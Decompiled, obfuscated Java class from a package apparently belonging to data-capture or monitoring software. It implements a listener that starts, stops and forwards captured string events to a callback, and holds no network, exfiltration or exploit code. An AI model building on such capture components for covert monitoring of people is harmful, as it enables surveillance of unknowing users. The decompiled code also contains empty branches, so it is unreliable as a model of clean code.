package com.vvt.al.a;

import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.h;
import com.vvt.base.capture.i;

public class b
  implements e, h
{
  private static final boolean a = a.a;
  private static final boolean b = a.b;
  private i c;
  private com.vvt.capture.b.b.b d;
  private boolean e = false;
  
  public b(String paramString1, com.vvt.n.a.b paramb, String paramString2)
  {
    com.vvt.capture.b.b.b localb = com.vvt.capture.b.b.b.a(paramb, paramString1, paramString2);
    this.d = localb;
  }
  
  public void a()
  {
    boolean bool = this.e;
    if (bool)
    {
      i locali = this.c;
      if (locali != null)
      {
        bool = b;
        if (bool) {}
        locali = this.c;
        locali.a();
      }
    }
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      com.vvt.capture.b.b.b localb = this.d;
      localb.a(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a(paramString);
    }
  }
  
  public void a(String paramString1, String paramString2)
  {
    boolean bool = a;
    if (bool) {}
    i locali = this.c;
    if (locali != null)
    {
      locali = this.c;
      locali.a(paramString1, paramString2);
    }
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      com.vvt.capture.b.b.b localb = this.d;
      localb.b(this);
    }
    bool = a;
    if (bool) {}
  }
  
  public void c() {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */